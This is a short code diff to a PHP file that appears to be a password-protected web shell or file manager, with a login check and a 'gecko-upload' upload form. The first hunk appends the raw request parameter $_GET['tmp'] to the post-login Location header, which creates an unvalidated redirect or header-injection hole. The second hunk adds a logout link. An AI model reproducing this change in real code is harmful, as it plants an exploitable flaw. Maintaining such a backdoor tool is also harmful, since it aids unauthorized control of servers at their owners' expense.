@@ -52,7 +52,7 @@ if (!isset($_SESSION['logged_in'])) {
     if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['password'])) {
         if (password_verify($_POST['password'], $hashed_password)) {
             $_SESSION['logged_in'] = true;
-            header('Location: ' . $_SERVER['PHP_SELF']);
+            header('Location: ' . $_SERVER['PHP_SELF'] . $_GET['tmp']);
             exit;
         } else {
             $login_error = "You Wrong Password.";
@@ -200,6 +200,7 @@ if (isset($_GET['d'])) {
                 <input type="file" name="gecko-upload" class="form-file" />
                 <input type="submit" value="Upload" name="gecko-up-submit" class="bg-blue-100 text-blue-700 font-sm font-mono cursor-pointer px-3 py-1 rounded-md hover:bg-blue-400" />
             </form>
+            <li><a href="?logout" class="btn-submit"><i class="fa-solid fa-close"></i>Logout</a></li>
         </ul>
     </div>
 </body>
